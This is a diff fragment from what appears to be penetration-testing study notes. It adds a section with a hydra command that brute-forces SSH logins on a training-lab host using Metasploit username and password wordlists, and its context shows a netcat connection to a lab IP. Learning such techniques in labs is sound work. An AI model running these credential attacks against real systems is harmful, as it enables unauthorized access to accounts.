@@ -2743,3 +2743,9 @@ nc -nv 10.10.31.2 1234
 
 ```
 Type message it will reflect in system 1 and vice versa
+
+#### Brute forcing OpenSSh
+```
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local ssh
+
+```
